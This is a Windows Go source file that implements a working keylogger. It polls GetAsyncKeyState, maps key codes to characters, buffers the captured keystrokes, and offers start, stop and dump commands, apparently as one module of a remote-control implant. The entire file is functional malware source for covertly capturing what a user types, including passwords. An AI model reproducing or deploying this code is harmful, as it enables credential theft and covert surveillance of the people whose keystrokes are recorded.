//go:build windows

package main

import (
	"strings"
	"sync"
	"syscall"
	"time"
)

var (
	klMu   sync.Mutex
	klBuf  strings.Builder
	klOn   bool
	klPrev [256]bool
)

var (
	user32      = syscall.NewLazyDLL("user32.dll")
	procAsyncKs = user32.NewProc("GetAsyncKeyState")
)

func keylogStart(dev string) Result {
	klMu.Lock()
	if klOn {
		klMu.Unlock()
		return Result{OK: true, Out: "already running"}
	}
	klOn = true
	klMu.Unlock()
	go klPoll()
	return Result{OK: true, Out: "keylogging (GetAsyncKeyState)"}
}

func keylogStop() Result {
	klMu.Lock()
	klOn = false
	klMu.Unlock()
	return Result{OK: true, Out: "stopped"}
}

func keylogDump(clear bool) Result {
	klMu.Lock()
	defer klMu.Unlock()
	out := klBuf.String()
	if clear {
		klBuf.Reset()
	}
	if out == "" {
		return Result{OK: true, Out: "(empty)"}
	}
	return Result{OK: true, Out: out}
}

func klPoll() {
	for {
		klMu.Lock()
		on := klOn
		klMu.Unlock()
		if !on {
			return
		}
		shift := down(16) || down(160)
		caps := down(20)
		for vk := 8; vk < 256; vk++ {
			pressed := down(vk)
			if pressed && !klPrev[vk] {
				klPrev[vk] = true
				if ch := vkToChar(vk, shift, caps); ch != "" {
					klAppend(ch)
				}
			} else if !pressed && klPrev[vk] {
				klPrev[vk] = false
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func down(vk int) bool {
	r, _, _ := procAsyncKs.Call(uintptr(vk))
	return r&0x8000 != 0
}

func vkToChar(vk int, shift, caps bool) string {
	if vk >= 0x41 && vk <= 0x5A { // A-Z
		if shift != caps {
			return string(byte(vk))
		}
		return string(byte(vk) + 32)
	}
	if vk >= 0x30 && vk <= 0x39 { // 0-9
		base := "0123456789"
		shifted := ")!@#$%^&*("
		if shift {
			return string(shifted[vk-0x30])
		}
		return string(base[vk-0x30])
	}
	switch vk {
	case 0x08:
		return "\b"
	case 0x09:
		return "\t"
	case 0x0D:
		return "\n"
	case 0x20:
		return " "
	case 0xBA:
		if shift {
			return ":"
		}
		return ";"
	case 0xBB:
		if shift {
			return "+"
		}
		return "="
	case 0xBC:
		if shift {
			return "<"
		}
		return ","
	case 0xBD:
		if shift {
			return "_"
		}
		return "-"
	case 0xBE:
		if shift {
			return ">"
		}
		return "."
	case 0xBF:
		if shift {
			return "?"
		}
		return "/"
	case 0xC0:
		if shift {
			return "~"
		}
		return "`"
	case 0xDB:
		if shift {
			return "{"
		}
		return "["
	case 0xDC:
		if shift {
			return "|"
		}
		return "\\"
	case 0xDD:
		if shift {
			return "}"
		}
		return "]"
	case 0xDE:
		if shift {
			return `"`
		}
		return "'"
	}
	return ""
}

func klAppend(s string) {
	klMu.Lock()
	klBuf.WriteString(s)
	klMu.Unlock()
}